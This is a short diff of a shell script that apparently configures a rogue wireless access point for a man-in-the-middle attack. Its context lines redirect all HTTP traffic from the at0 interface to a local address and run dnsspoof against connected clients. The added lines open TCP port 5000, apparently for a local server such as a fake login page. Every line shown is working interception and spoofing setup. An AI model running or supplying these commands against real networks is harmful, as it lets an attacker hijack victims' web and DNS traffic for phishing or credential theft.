@@ -35,6 +35,8 @@ iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
 iptables --append FORWARD --in-interface at0 -j ACCEPT
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
 iptables -t nat -A POSTROUTING -j MASQUERADE
+iptables -A INPUT -p tcp --dport 5000 -j ACCEPT
+iptables -A OUTPUT -p tcp --sport 5000 -j ACCEPT
 
 #redirect all HTTP traffic coming from the at0 interface.
 dnsspoof -i at0
